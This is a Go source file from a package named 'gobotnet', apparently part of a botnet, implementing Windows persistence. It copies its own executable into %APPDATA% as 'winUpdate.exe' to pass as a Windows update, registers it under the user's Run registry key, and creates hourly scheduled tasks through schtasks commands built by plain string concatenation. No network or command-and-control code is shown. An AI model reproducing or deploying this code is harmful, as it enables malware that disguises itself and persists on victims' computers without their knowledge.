package gobotnet

import (
	"errors"
	"fmt"
	"github.com/satori/go.uuid"
	"golang.org/x/sys/windows/registry"
	"io"
	"os"
)

var (
	programName        string = "winUpdate"
	copyProgramDir     string = os.Getenv("APPDATA") + `\WindowsUpdate`
	copyExecFilePath   string = copyProgramDir + `\` + programName + ".exe"
	sourceExecFilePath string = os.Args[0]
	uid                uuid.UUID
)

func RegTest() {
	fmt.Println("RegTest")
	// var err error

	// err = os.MkdirAll(copyProgramDir, 0777)
	// fmt.Println(err)

	// err = RegisterAutoRun()
	// fmt.Println(err)

	// err = CopyFileToDirectory(sourceExecFilePath, copyExecFilePath)
	// fmt.Println(err)
}

func RegisterAutoRun() error {
	err := WriteRegistryKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, programName, copyExecFilePath)
	return err
}

func IsRegisterAutoRun() error {
	err := IsValueSetRegistryKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, programName)
	return err
}

func UnRegisterAutoRun() {
	DeleteRegistryKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, programName)
}

func RegisterSchedule(nameTask string, pathToFile string) ([]byte, error) {
	return CmdExec("schtasks /create /f /tn " + nameTask + " /sc hourly /mo 1 /tr " + pathToFile)
}

func IsRegisterSchedule(nameTask string) ([]byte, error) {
	return CmdExec("schtasks /query /tn " + nameTask + "\"")
}

func UnRegisterSchedule(nameTask string) ([]byte, error) {
	return CmdExec("schtasks /delete /f /tn " + nameTask)
}

func CopyFileToDirectory(pathSourceFile string, pathDestFile string) error {
	sourceFile, err := os.Open(pathSourceFile)
	if err != nil {
		return err
	}
	defer sourceFile.Close()

	destFile, err := os.Create(pathDestFile)
	if err != nil {
		return err
	}
	defer destFile.Close()

	_, err = io.Copy(destFile, sourceFile)
	if err != nil {
		return err
	}

	err = destFile.Sync()
	if err != nil {
		return err
	}

	sourceFileInfo, err := sourceFile.Stat()
	if err != nil {
		return err
	}

	destFileInfo, err := destFile.Stat()
	if err != nil {
		return err
	}

	if sourceFileInfo.Size() == destFileInfo.Size() {
	} else {
		return errors.New("Bad copy file")
	}
	return nil
}
